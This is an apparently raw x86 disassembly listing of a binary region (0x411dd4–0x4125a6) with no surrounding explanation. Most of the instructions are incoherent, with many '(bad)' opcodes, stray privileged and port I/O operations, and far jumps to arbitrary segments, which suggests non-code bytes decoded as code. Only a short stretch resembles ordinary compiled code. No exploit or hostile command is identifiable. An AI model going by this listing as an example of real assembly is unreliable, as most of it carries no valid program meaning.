  411dd4:	mov    ah,0x15
  411dd6:	daa    
  411dd7:	jo     0x411e20
  411dd9:	pop    ss
  411dda:	add    eax,0x7c59d57
  411ddf:	scas   eax,DWORD PTR es:[edi]
  411de0:	mov    bl,0xd8
  411de3:	call   0xace8ad86
  411de8:	es mov ebx,0x7e37f095
  411dee:	adc    ah,BYTE PTR [edi]
  411df0:	adc    eax,0x2d179667
  411df5:	mov    ebp,0xe31164bd
  411dfa:	cmp    dh,BYTE PTR [esi+edx*4-0x79c086d0]
  411e01:	inc    ebp
  411e02:	fnstcw WORD PTR [ebx+ebx*2+0x4837cb5]
  411e09:	inc    eax
  411e0a:	test   BYTE PTR [ebx],0x59
  411e0d:	sahf   
  411e0e:	imul   ecx,DWORD PTR [ecx],0x5fc33bb1
  411e14:	adc    edx,edx
  411e16:	xlat   BYTE PTR ds:[ebx]
  411e17:	adc    ebp,DWORD PTR [edi-0x22]
  411e1a:	dec    ebp
  411e1b:	repz pushf 
  411e1d:	outs   dx,BYTE PTR ds:[esi]
  411e1e:	mov    ebx,0x30025718
  411e23:	mov    fs,WORD PTR [esi-0x2764ad26]
  411e29:	pop    edx
  411e2a:	je     0x411e0a
  411e2c:	ss adc ecx,0x8bb448c4
  411e33:	adc    cl,bl
  411e35:	xchg   esi,eax
  411e36:	xchg   esi,eax
  411e37:	inc    edi
  411e38:	inc    edi
  411e39:	popf   
  411e3a:	jnp    0x411e30
  411e3c:	les    edi,FWORD PTR ds:0xeb420b86
  411e42:	fwait
  411e43:	add    ecx,DWORD PTR [esi+0x1e]
  411e46:	mov    bh,0x83
  411e48:	xlat   BYTE PTR ds:[ebx]
  411e49:	sub    ecx,esi
  411e4b:	popa   
  411e4c:	fcomp  QWORD PTR [eax+0x56e5f19b]
  411e52:	call   0xe7a2:0x906f3d02
  411e59:	dec    ecx
  411e5a:	inc    eax
  411e5b:	pop    esp
  411e5c:	jae    0x411e71
  411e5e:	push   ebp
  411e5f:	loop   0x411e9e
  411e61:	dec    eax
  411e62:	imul   edx,DWORD PTR [esi-0x37660955],0xa779b44e
  411e6c:	(bad)  
  411e6d:	fistp  QWORD PTR [esi]
  411e6f:	rol    DWORD PTR [ecx+0x4e0f0293],0x64
  411e76:	jnp    0x411ef2
  411e78:	imul   ebx,DWORD PTR [edx+0x4f32e8ff],0x3b7dd011
  411e82:	iret   
  411e83:	vmwrite ebx,DWORD PTR ds:0x42d9f9f7
  411e8a:	push   ecx
  411e8b:	xchg   esp,eax
  411e8c:	ret    
  411e8d:	adc    ebp,DWORD PTR [ebp+edx*8+0x7e]
  411e91:	mov    al,0x62
  411e93:	or     DWORD PTR [esi],ebx
  411e95:	adc    eax,0xbf23e2e0
  411e9a:	mov    al,0x5e
  411e9c:	je     0x411e72
  411e9e:	stc    
  411e9f:	dec    ecx
  411ea0:	pop    ebp
  411ea1:	or     al,0xf6
  411ea3:	clc    
  411ea4:	cld    
  411ea5:	mov    WORD PTR ds:0x5720987b,fs
  411eab:	mov    DWORD PTR [edx-0x52584909],ebx
  411eb1:	loop   0x411ed0
  411eb3:	enter  0x9653,0x96
  411eb7:	shl    BYTE PTR [edx+0x35],1
  411eba:	pop    ds
  411ebb:	lods   al,BYTE PTR ds:[esi]
  411ebc:	ror    BYTE PTR [eax+0x39aebac6],0x7e
  411ec3:	stc    
  411ec4:	imul   ebp,DWORD PTR [edi],0x50
  411ec7:	fild   WORD PTR [ebx+0xb3ee8f9]
  411ecd:	cmc    
  411ece:	xor    BYTE PTR [eax],ah
  411ed0:	sub    al,0x91
  411ed2:	shl    DWORD PTR [ebx+0x3f],cl
  411ed5:	adc    eax,0xa7e07e5
  411eda:	or     ebx,DWORD PTR [ebp+0x2c9032d]
  411ee0:	(bad)  
  411ee1:	int    0x7
  411ee3:	stos   DWORD PTR es:[edi],eax
  411ee4:	repnz cmp ebp,DWORD PTR [ebp-0x13fbb43b]
  411eeb:	(bad)
  411eee:	xor    edx,0xffffffb5
  411ef1:	dec    ebp
  411ef2:	xchg   ebx,eax
  411ef3:	dec    esi
  411ef4:	or     BYTE PTR [edx+0x4faf8d2d],bh
  411efa:	lea    esp,[edx-0x1]
  411efd:	cli    
  411efe:	pop    eax
  411eff:	fst    QWORD PTR [ecx+0x4e]
  411f02:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  411f04:	sti    
  411f05:	xchg   esp,eax
  411f06:	mov    ah,0xd4
  411f08:	out    dx,al
  411f09:	xchg   esp,eax
  411f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f0b:	aad    0xe8
  411f0d:	in     al,dx
  411f0e:	jecxz  0x411f40
  411f10:	fwait
  411f11:	mov    dh,0xfa
  411f13:	rol    DWORD PTR [ebp+eax*8-0x44b6acc],1
  411f1a:	push   edx
  411f1b:	shl    esp,1
  411f1d:	sbb    eax,0xcd81395c
  411f22:	xchg   edx,eax
  411f23:	jg     0x411f9c
  411f25:	mov    ch,dh
  411f27:	xor    DWORD PTR [edx-0x12447a27],esp
  411f2d:	mov    WORD PTR [ecx+0x33],ss
  411f30:	add    esp,eax
  411f32:	test   DWORD PTR [edx],edx
  411f34:	out    0x6f,eax
  411f36:	outs   dx,DWORD PTR ds:[esi]
  411f37:	out    0x15,al
  411f39:	xchg   esi,eax
  411f3a:	cld    
  411f3b:	mov    ds:0x5056a90,eax
  411f40:	pop    ebp
  411f41:	jmp    0x16f3:0x31004ef6
  411f48:	ret    
  411f49:	pop    edx
  411f4a:	aad    0x3e
  411f4c:	sbb    ebp,DWORD PTR [eax+eax*2-0x2b]
  411f50:	sub    BYTE PTR [ebp-0xe],bl
  411f53:	imul   esi,eax,0xf40aec16
  411f59:	mov    ebx,0xa96924ee
  411f5e:	cmc    
  411f5f:	mov    ?,WORD PTR [ecx+0xf8a606b]
  411f65:	adc    DWORD PTR [eax],0xdb06e2b7
  411f6b:	mov    al,ds:0x12f91baa
  411f70:	mov    edi,0x558bda9d
  411f75:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	jmp    0x411f23
  411f90:	out    0xc8,al
  411f92:	jmp    0x411fff
  411f94:	js     0x41200e
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	add    dl,BYTE PTR ss:[esi-0x4095608b]
  411fa1:	cmp    edx,ecx
  411fa3:	or     DWORD PTR [edi+0x74],edx
  411fa6:	jae    0x411fa1
  411fa8:	adc    DWORD PTR [ecx-0x52e9fff9],0xfffffffa
  411faf:	jge    0x411fc8
  411fb1:	mov    eax,ds:0xc8c2eb03
  411fb6:	scas   al,BYTE PTR es:[edi]
  411fb7:	call   0xfe9c:0x850a1c8b
  411fbe:	paddq  mm5,QWORD PTR [eax+esi*2+0x718c7e7b]
  411fc6:	sub    ebx,DWORD PTR [edi+0xd586e39]
  411fcc:	mov    ch,0xd3
  411fce:	jb     0x411fa6
  411fd0:	in     al,0x95
  411fd2:	popa   
  411fd3:	sub    BYTE PTR [ebp+0x762d4ecb],0xf6
  411fda:	add    esi,DWORD PTR [esi]
  411fdc:	mov    eax,ds:0xd0399969
  411fe1:	jbe    0x411f6e
  411fe3:	js     0x411f7d
  411fe5:	sahf   
  411fe6:	idiv   DWORD PTR [ebp-0x27]
  411fe9:	outs   dx,BYTE PTR ds:[esi]
  411fea:	cmp    ch,BYTE PTR [edi]
  411fec:	in     al,dx
  411fed:	aam    0x1a
  411fef:	xor    eax,0x42d17cb3
  411ff4:	pop    ebx
  411ff5:	leave  
  411ff6:	test   eax,0x44a8a09f
  411ffb:	popa   
  411ffc:	repnz or al,0xb7
  411fff:	cs mov ah,0x5b
  412002:	sbb    ebp,ebp
  412004:	iret   
  412005:	cmp    edi,DWORD PTR [esi-0x14edf90d]
  41200b:	ins    BYTE PTR es:[edi],dx
  41200c:	test   BYTE PTR [ecx-0x7e],dh
  41200f:	mov    esi,0xa203e336
  412014:	xchg   esi,eax
  412015:	or     bl,dh
  412017:	push   esi
  412018:	pop    edi
  412019:	sub    eax,eax
  41201b:	xchg   edi,eax
  41201c:	or     al,0x65
  41201e:	pop    edi
  41201f:	je     0x412066
  412021:	mov    ch,0x33
  412023:	pop    ebp
  412024:	stos   DWORD PTR es:[edi],eax
  412025:	arpl   WORD PTR [edi-0x719cc1f6],bp
  41202b:	popa   
  41202c:	xchg   edx,eax
  41202d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41202f:	call   0x5d59:0x6ce418eb
  412036:	leave  
  412037:	cmp    ecx,eax
  412039:	daa    
  41203a:	int    0xa8
  41203c:	out    dx,al
  41203d:	xor    al,0xc4
  41203f:	je     0x412060
  412041:	fld    DWORD PTR ds:0xede95495
  412047:	mov    edx,0xb5b227bc
  41204c:	push   esi
  41204d:	mov    ebx,0x93686ef4
  412052:	mov    ah,0x7b
  412054:	daa    
  412055:	sbb    DWORD PTR [edx+0x47],esi
  412058:	fdiv   st,st(2)
  41205a:	xchg   BYTE PTR [edi+0x64],dl
  41205d:	adc    eax,0xd66e02e
  412062:	arpl   WORD PTR [esi],bp
  412064:	sub    DWORD PTR [ebp-0x4c],ecx
  412067:	in     al,0x41
  412069:	aad    0xc3
  41206b:	jge    0x41200c
  41206d:	and    edx,DWORD PTR [esi+0x6d916073]
  412073:	neg    DWORD PTR [edx+0x68]
  412076:	lds    ebp,FWORD PTR [edx+0x3b008aa]
  41207c:	pushf  
  41207d:	and    eax,0xe7678fd4
  412082:	jne    0x4120a6
  412084:	xchg   bl,ch
  412086:	loopne 0x412051
  412088:	xor    DWORD PTR [ecx-0x679151ce],esi
  41208e:	and    eax,0x66f8a4b2
  412093:	inc    ecx
  412094:	lds    esi,FWORD PTR [edi-0x2313f7b6]
  41209a:	sub    BYTE PTR [ebp+0x9],dh
  41209d:	and    BYTE PTR [esi+0x45],dl
  4120a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120a1:	nop
  4120a2:	cmp    edx,DWORD PTR [edi+0x4d]
  4120a5:	mov    ds:0x3e697d8,eax
  4120aa:	rcr    bl,1
  4120ac:	dec    esp
  4120ad:	outs   dx,DWORD PTR ds:[esi]
  4120ae:	scas   al,BYTE PTR es:[edi]
  4120af:	fcmovnbe st,st(0)
  4120b1:	xor    DWORD PTR [ecx+0x56804b90],esp
  4120b7:	or     al,0xdd
  4120b9:	xchg   ebp,eax
  4120ba:	enter  0x5285,0xcf
  4120be:	lahf   
  4120bf:	fsubr  DWORD PTR [ebp-0x169a2e05]
  4120c5:	mov    eax,0x24d427b6
  4120ca:	dec    eax
  4120cb:	loop   0x412055
  4120cd:	jne    0x41211c
  4120cf:	shr    cl,1
  4120d1:	rcl    ch,cl
  4120d3:	jb     0x41214f
  4120d5:	xchg   dl,bl
  4120d7:	lods   eax,DWORD PTR ds:[esi]
  4120d8:	stos   BYTE PTR es:[edi],al
  4120d9:	xor    dh,BYTE PTR [edi+ecx*4]
  4120dc:	test   eax,0xde719014
  4120e1:	dec    ebp
  4120e2:	cs (bad) 
  4120e4:	xchg   ebp,eax
  4120e5:	push   esp
  4120e6:	xor    DWORD PTR [ecx+eax*2+0x75],0xd24b4e71
  4120ee:	inc    ecx
  4120ef:	pop    ds
  4120f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f1:	call   FWORD PTR [ebx-0x5d6a9069]
  4120f7:	mov    bh,0x91
  4120f9:	int    0x3a
  4120fb:	sub    al,0xc9
  4120fd:	mov    edx,0x9a773da7
  412102:	xchg   edi,eax
  412103:	retf   
  412104:	push   0x4e3d4244
  412109:	enter  0x655f,0xe4
  41210d:	xchg   ebp,eax
  41210e:	xor    al,0x19
  412110:	stos   BYTE PTR es:[edi],al
  412111:	ror    bl,cl
  412113:	cmp    ch,ah
  412115:	ins    BYTE PTR es:[edi],dx
  412116:	mov    BYTE PTR [eax-0x408939cb],ah
  41211c:	inc    ebx
  41211d:	push   0xffffffbb
  41211f:	cld    
  412120:	add    eax,0xf40e0cc3
  412125:	and    ebx,DWORD PTR [edi+0x1c]
  412128:	imul   eax,DWORD PTR [ebx],0xfffffff3
  41212b:	jnp    0x412172
  41212d:	cwde   
  41212e:	mov    edi,0x3097a59d
  412133:	pop    ds
  412134:	aaa    
  412135:	data16 sbb BYTE PTR [eax-0x4f],ch
  412139:	mov    ah,BYTE PTR [esp+esi*8-0x74]
  41213d:	cwde   
  41213e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41213f:	ins    BYTE PTR es:[edi],dx
  412140:	ins    DWORD PTR es:[edi],dx
  412141:	jp     0x4120dd
  412143:	pop    esp
  412144:	and    al,BYTE PTR ds:0xb074cd8d
  41214a:	call   0x8e25:0x4d93a39b
  412151:	inc    ebx
  412152:	dec    esp
  412153:	push   cs
  412154:	inc    esp
  412155:	or     cl,BYTE PTR [eax]
  412157:	jl     0x4120fc
  412159:	ss dec edi
  41215b:	popf   
  41215c:	push   cs
  41215d:	adc    bh,BYTE PTR [edx+ecx*1-0x3e]
  412161:	mov    dl,0x11
  412163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412164:	lea    edi,[ecx+0x2d]
  412167:	jo     0x412103
  412169:	jb     0x41215f
  41216b:	and    eax,0x447b8fad
  412170:	addr16 mov esi,0x83b85411
  412176:	xchg   bl,bh
  412178:	je     0x4121d9
  41217a:	shl    ch,0x51
  41217d:	lods   eax,DWORD PTR ds:[esi]
  41217e:	ja     0x41218d
  412180:	sub    esp,DWORD PTR [ebx]
  412182:	dec    eax
  412183:	fwait
  412184:	bound  eax,QWORD PTR [eax+ecx*4+0x74]
  412188:	ins    BYTE PTR es:[edi],dx
  412189:	(bad)  
  41218a:	arpl   WORD PTR [esi+0x70710d4e],ax
  412190:	mov    eax,ds:0xc4abfb4c
  412195:	in     al,0x44
  412197:	mov    eax,ds:0x6bbdc304
  41219c:	popf   
  41219d:	push   edx
  41219e:	scas   eax,DWORD PTR es:[edi]
  41219f:	daa    
  4121a0:	add    bh,0xae
  4121a3:	xchg   al,ah
  4121a5:	cmp    DWORD PTR [esp+esi*8],edx
  4121a8:	lea    ebp,[ebp+0x52]
  4121ab:	sbb    al,0x2d
  4121ad:	jecxz  0x4121c6
  4121af:	mov    ds:0x45e28684,al
  4121b4:	dec    dh
  4121b6:	mov    al,ds:0x474f27cb
  4121bb:	lods   al,BYTE PTR ds:[esi]
  4121bc:	cwde   
  4121bd:	jbe    0x41214d
  4121bf:	pop    ds
  4121c0:	das    
  4121c1:	test   DWORD PTR [eax-0x3b9ef7f1],edx
  4121c7:	cmp    DWORD PTR [eax+0x21097cfc],esi
  4121cd:	out    dx,eax
  4121ce:	inc    ecx
  4121cf:	fwait
  4121d0:	dec    ebx
  4121d1:	dec    ebx
  4121d2:	mov    cl,0x58
  4121d4:	arpl   WORD PTR [ecx],sp
  4121d6:	arpl   WORD PTR [ecx+0x4ec15dea],bx
  4121dc:	xchg   edx,eax
  4121dd:	imul   edi,DWORD PTR [ecx],0xf
  4121e0:	daa    
  4121e1:	daa    
  4121e2:	daa    
  4121e3:	(bad)  
  4121e4:	retf   0xdba6
  4121e7:	in     eax,0xe9
  4121e9:	out    0xcd,eax
  4121eb:	inc    ebp
  4121ec:	cli    
  4121ed:	ja     0x4121b1
  4121ef:	lahf   
  4121f0:	mov    BYTE PTR [ebp-0x2a75db2c],cl
  4121f6:	lea    eax,ds:0xd1631991
  4121fc:	test   bh,dh
  4121fe:	xlat   BYTE PTR ds:[ebx]
  4121ff:	sbb    al,0xb3
  412201:	shl    DWORD PTR [edi-0x6fcc73b],1
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	adc    ah,dl
  412235:	pop    eax
  412236:	and    DWORD PTR [eax+0x69],edx
  412239:	js     0x4122b3
  41223b:	in     eax,0x7e
  41223d:	js     0x4122b7
  41223f:	sub    al,0x82
  412241:	sub    al,bl
  412243:	push   ss
  412244:	push   es
  412245:	mov    edx,0x333158fe
  41224a:	call   0xbf80:0x55e2c26
  412251:	pop    ss
  412252:	sbb    BYTE PTR [esi+0x1a],dl
  412255:	not    cl
  412257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412258:	sub    edi,ebx
  41225a:	cmp    edx,eax
  41225c:	mov    eax,ds:0xd749a71e
  412261:	pop    ebp
  412262:	pop    edx
  412263:	mov    gs,esi
  412265:	(bad)  
  412266:	imul   edi,DWORD PTR [ebp+0x51],0xffffff86
  41226a:	mov    ah,BYTE PTR [esi]
  41226c:	cwde   
  41226d:	pop    edx
  41226e:	test   eax,0x81653d65
  412273:	jne    0x4122ce
  412275:	lods   al,BYTE PTR ds:[esi]
  412276:	aaa    
  412277:	sub    al,0x20
  412279:	or     edi,DWORD PTR [edx]
  41227b:	jl     0x412217
  41227d:	sub    al,0x57
  41227f:	(bad)  
  412281:	(bad)  
  412282:	jecxz  0x4122f5
  412284:	mov    edi,0x215fc16e
  412289:	sbb    ebp,DWORD PTR [eax]
  41228b:	dec    ebp
  41228c:	pop    ss
  41228d:	inc    esi
  41228e:	lods   al,BYTE PTR ds:[esi]
  41228f:	xor    al,0x45
  412291:	fnstenv [ebp-0x45]
  412294:	push   edi
  412295:	es or  bh,bh
  412298:	push   0x30e5432f
  41229d:	stc    
  41229e:	test   BYTE PTR [ebx+esi*1+0x50],bl
  4122a2:	repz ret 
  4122a4:	inc    esp
  4122a5:	push   ebp
  4122a6:	fild   DWORD PTR [edi+0x69]
  4122a9:	rcl    BYTE PTR [ebp+0x62],1
  4122ac:	dec    esi
  4122ad:	jns    0x412282
  4122af:	data16 xor BYTE PTR [ecx-0x2dff4388],dh
  4122b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122b7:	or     BYTE PTR [edi-0x6d9d21af],ah
  4122bd:	aam    0xdc
  4122bf:	test   eax,0x7104d3b8
  4122c4:	and    DWORD PTR [ebx],edi
  4122c6:	dec    esi
  4122c7:	xchg   esp,eax
  4122c8:	mov    ecx,0x59b71181
  4122cd:	xchg   esp,eax
  4122ce:	loopne 0x4122e1
  4122d0:	mov    ebx,0xa6742c52
  4122d5:	jl     0x4122f1
  4122d7:	and    BYTE PTR [ecx+0x23],bh
  4122da:	cmp    dh,BYTE PTR [ecx-0x9]
  4122dd:	int    0x28
  4122df:	jmp    0x579cbb0e
  4122e4:	into   
  4122e5:	mov    WORD PTR [esi-0x1d1d6588],gs
  4122eb:	dec    eax
  4122ec:	das    
  4122ed:	into   
  4122ee:	out    dx,al
  4122ef:	cmp    DWORD PTR [edx+eax*1-0x692b84cd],ebp
  4122f6:	(bad)  
  4122f7:	popa   
  4122f8:	fs ins BYTE PTR es:[edi],dx
  4122fa:	add    bh,dl
  4122fc:	pop    edx
  4122fd:	popa   
  4122fe:	mov    ch,0x4e
  412300:	add    ebp,DWORD PTR [ebx+ecx*8+0x6cabe499]
  412307:	jmp    DWORD PTR [ebx+0x344ce6a]
  41230d:	xchg   edi,eax
  41230e:	xor    al,0x29
  412310:	loope  0x412363
  412312:	leave  
  412313:	or     dh,BYTE PTR [eax+0xcd51a2e]
  412319:	out    0x16,eax
  41231b:	aaa    
  41231c:	mov    ds:0x7a8ccb16,eax
  412321:	fld    DWORD PTR [eax+0x51731dae]
  412327:	mov    esi,0x36f92d20
  41232c:	ret    0xed0f
  41232f:	ficom  WORD PTR ds:0xc00467ca
  412335:	gs sti 
  412337:	adc    al,0x76
  412339:	mov    ah,0xb1
  41233b:	hlt    
  41233c:	popa   
  41233d:	out    dx,eax
  41233e:	mov    ebp,0xf723cd3d
  412343:	mov    DWORD PTR [eax-0x7d],edi
  412346:	cmp    al,0xde
  412348:	add    eax,0xeefa9fbc
  41234d:	jnp    0x412302
  41234f:	loop   0x412320
  412351:	aaa    
  412352:	clc    
  412353:	out    dx,eax
  412354:	inc    eax
  412355:	retf   0x9543
  412358:	fnstenv [edi+edx*8+0x56]
  41235c:	call   0xe4f8:0x7c107e4e
  412363:	push   esp
  412364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412365:	aas    
  412366:	mov    BYTE PTR [edi],dh
  412368:	jmp    0x412372
  41236a:	daa    
  41236b:	scas   al,BYTE PTR es:[edi]
  41236c:	lods   eax,DWORD PTR ds:[esi]
  41236d:	ds jbe 0x41232b
  412370:	std    
  412371:	mov    ecx,0x74dd77dd
  412376:	xor    DWORD PTR ds:0x8e35bdfe,esp
  41237c:	dec    edi
  41237d:	gs sub eax,0x5a3dae66
  412383:	imul   edx,DWORD PTR [ebp-0x53],0xffffffbb
  412387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412388:	popf   
  412389:	pop    ss
  41238a:	mov    ch,0x8d
  41238c:	scas   al,BYTE PTR es:[edi]
  41238d:	sbb    ah,al
  41238f:	mov    DWORD PTR [edi+0x331c4f18],esi
  412395:	push   edx
  412396:	mov    ds:0x1b2aa247,eax
  41239b:	add    DWORD PTR [edi],0x1
  41239e:	(bad)  
  41239f:	cwde   
  4123a0:	xlat   BYTE PTR ds:[ebx]
  4123a1:	daa    
  4123a2:	dec    esi
  4123a3:	cmp    DWORD PTR [edi+edx*8],0xbe4aebab
  4123aa:	mov    eax,ds:0xf84c90af
  4123af:	inc    esi
  4123b0:	dec    edi
  4123b1:	enter  0x51a7,0xf3
  4123b5:	add    eax,DWORD PTR [edx+0x524d21df]
  4123bb:	sbb    edi,ecx
  4123bd:	jle    0x412432
  4123bf:	xor    al,0xec
  4123c1:	out    0xb9,eax
  4123c3:	stc    
  4123c4:	add    ax,0xa970
  4123c8:	retf   0x661b
  4123cb:	pop    esp
  4123cc:	ret    
  4123cd:	ja     0x41235a
  4123cf:	es push cs
  4123d1:	cli    
  4123d2:	aad    0x36
  4123d4:	sbb    ecx,0x8
  4123d7:	pcmpgtb mm4,QWORD PTR [edx]
  4123da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123db:	inc    WORD PTR [esi]
  4123de:	fstp   DWORD PTR [edi+0x40]
  4123e1:	inc    esp
  4123e2:	clc    
  4123e3:	cdq    
  4123e4:	into   
  4123e5:	ficomp DWORD PTR [edx-0x63]
  4123e8:	xor    al,ah
  4123ea:	sub    bh,dh
  4123ec:	popf   
  4123ed:	cmp    DWORD PTR [eax-0x7c],eax
  4123f0:	xor    BYTE PTR [esi-0x5d],bh
  4123f3:	sbb    BYTE PTR [ecx+0x77],dl
  4123f6:	outs   dx,BYTE PTR ds:[esi]
  4123f7:	inc    esi
  4123f8:	mov    cs,WORD PTR [edx-0x47286ff0]
  4123fe:	xchg   edi,eax
  4123ff:	and    ebx,DWORD PTR [eax]
  412401:	push   ss
  412402:	sbb    cl,0x29
  412405:	mov    esi,0xca7f3fe6
  41240a:	pop    es
  41240b:	cmp    BYTE PTR [edx],ah
  41240d:	mov    bl,0xf9
  41240f:	rcl    DWORD PTR [esi],cl
  412411:	or     DWORD PTR ds:0x6a87ab74,esi
  412417:	popf   
  412418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412419:	ja     0x4123f6
  41241b:	or     al,0x81
  41241d:	dec    eax
  41241e:	or     eax,0x1822a9f1
  412423:	std    
  412424:	es popf 
  412426:	inc    esp
  412427:	mov    bl,0x6e
  412429:	and    ah,bh
  41242b:	adc    eax,DWORD PTR [edi]
  41242d:	add    edx,DWORD PTR [ebx+0x4486d117]
  412433:	outs   dx,BYTE PTR ds:[si]
  412435:	adc    BYTE PTR [edi-0x27],0x4e
  412439:	cmp    BYTE PTR [esi],cl
  41243b:	push   ds
  41243c:	mov    ds:0x82034643,al
  412441:	ins    BYTE PTR es:[edi],dx
  412442:	push   es
  412443:	adc    ah,BYTE PTR [edi]
  412445:	xlat   BYTE PTR ds:[ebx]
  412446:	stos   BYTE PTR es:[edi],al
  412447:	outs   dx,BYTE PTR ds:[esi]
  412448:	lods   al,BYTE PTR ds:[esi]
  412449:	stos   BYTE PTR es:[edi],al
  41244a:	imul   edi,DWORD PTR [ebx+0x7e],0x30479c82
  412451:	aam    0xd3
  412453:	fs sahf 
  412455:	and    edi,DWORD PTR ds:0x8267a947
  41245b:	sbb    eax,0x7ec7c78
  412460:	rol    BYTE PTR [eax+0x4502d3b8],1
  412466:	out    0xb9,al
  412468:	sub    DWORD PTR [ebx+0xf],esp
  41246b:	pop    es
  41246c:	inc    eax
  41246d:	rcl    dh,0x22
  412470:	jp     0x412400
  412472:	and    cl,BYTE PTR [ebx]
  412474:	xor    bl,BYTE PTR [edi-0x6d9b5b2]
  41247a:	shl    DWORD PTR [esi+eax*8+0x45fc9f49],cl
  412481:	leave  
  412482:	mov    ah,0x28
  412484:	pmulhw mm4,QWORD PTR [ebx*4-0x5909a6dc]
  41248c:	in     al,0xf3
  41248e:	jo     0x412486
  412490:	mov    ebp,0xf0e29c0d
  412495:	iret   
  412496:	inc    ebx
  412497:	xlat   BYTE PTR ds:[ebx]
  412498:	data16 cld 
  41249a:	mov    ebp,DWORD PTR [ecx-0x9]
  41249d:	xchg   esi,eax
  41249e:	call   0x4c892751
  4124a3:	sbb    ecx,ebx
  4124a5:	retf   
  4124a6:	test   eax,0x89666227
  4124ab:	push   ebp
  4124ac:	in     al,0xe9
  4124ae:	add    DWORD PTR [edx],0x0
  4124b1:	add    bh,cl
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0x571ebe60
  4124bf:	scas   al,BYTE PTR es:[edi]
  4124c0:	pop    ss
  4124c1:	std    
  4124c2:	cmp    eax,0xe578786e
  4124c7:	jle    0x412541
  4124c9:	js     0x412487
  4124cb:	xchg   ebp,eax
  4124cc:	dec    ebx
  4124cd:	mov    ds:0xe5528ddf,eax
  4124d2:	dec    edx
  4124d3:	fild   WORD PTR [edi]
  4124d5:	sbb    DWORD PTR [esi],0x7d91fb2f
  4124db:	dec    edx
  4124dc:	inc    ecx
  4124dd:	mov    ecx,0x4c9acccc
  4124e2:	and    al,0x6d
  4124e4:	lock loopne 0x4124e2
  4124e7:	outs   dx,BYTE PTR ds:[esi]
  4124e8:	cwde   
  4124e9:	mov    dl,0x7d
  4124eb:	rcl    esp,cl
  4124ed:	mov    edi,0x1fccb69e
  4124f2:	fld1   
  4124f5:	dec    bh
  4124f7:	into   
  4124f8:	loope  0x4124ca
  4124fa:	jo     0x4124f8
  4124fc:	and    ch,BYTE PTR [edx-0x7a]
  4124ff:	push   0xcd23b2eb
  412504:	es adc al,0xf3
  412507:	jecxz  0x4124a4
  412509:	push   esi
  41250a:	sbb    BYTE PTR [eax],bl
  41250c:	cmp    dh,al
  41250e:	xchg   edx,eax
  41250f:	cmp    eax,edi
  412511:	jge    0x41251d
  412513:	popf   
  412514:	add    eax,0xd98353c
  412519:	in     al,0x62
  41251b:	dec    edx
  41251c:	sbb    DWORD PTR [esi+0xb],ebx
  41251f:	add    eax,0x20b0e4e0
  412524:	ss (bad) 
  412526:	mov    ds:0xd5686b71,al
  41252b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41252c:	iret   
  41252d:	xor    edx,DWORD PTR [esi+eiz*1]
  412530:	hlt    
  412531:	cli    
  412532:	and    eax,0xd45bf553
  412537:	ins    DWORD PTR es:[edi],dx
  412538:	mov    ds:0xf3134dd2,al
  41253d:	data16 xor dl,BYTE PTR [edi-0x46]
  412541:	aas    
  412542:	(bad)  
  412543:	sahf   
  412544:	fsubr  st,st(3)
  412546:	xlat   BYTE PTR ds:[ebx]
  412547:	and    DWORD PTR [eax-0x24c86bbe],edx
  41254d:	cmc    
  41254e:	bound  edi,QWORD PTR [esi-0x53]
  412551:	inc    edi
  412552:	dec    eax
  412553:	popa   
  412554:	xor    BYTE PTR [ebx],0x6f
  412557:	and    DWORD PTR [edx-0x5c0ebe10],0x0
  41255e:	in     eax,dx
  41255f:	ja     0x412569
  412561:	(bad)  
  412562:	out    0x7f,al
  412564:	(bad)  
  412565:	mov    esp,esi
  412567:	and    ah,BYTE PTR [ebx+ebx*1]
  41256a:	mov    cl,0x59
  41256c:	add    DWORD PTR [ecx+0x54],ecx
  41256f:	rcr    edx,cl
  412571:	jbe    0x4125a7
  412573:	and    bh,BYTE PTR [edx-0x2483504e]
  412579:	fcom   DWORD PTR [edx+0x5a]
  41257c:	mov    ch,0x32
  41257e:	pop    ss
  41257f:	fstp   QWORD PTR [eax-0x20]
  412582:	test   BYTE PTR [eax],dh
  412584:	jae    0x41255e
  412586:	div    DWORD PTR [edx-0x62d0e25f]
  41258c:	outs   dx,DWORD PTR ds:[esi]
  41258d:	dec    ecx
  41258e:	fbstp  TBYTE PTR [ebx-0x625bb9e]
  412594:	fild   QWORD PTR ds:0x97aeb0df
  41259a:	and    al,0xe9
  41259c:	cmc    
  41259d:	je     0x41252d
  41259f:	aaa    
  4125a0:	test   DWORD PTR [esi+0x606e1b9e],edx
  4125a6:	(bad)
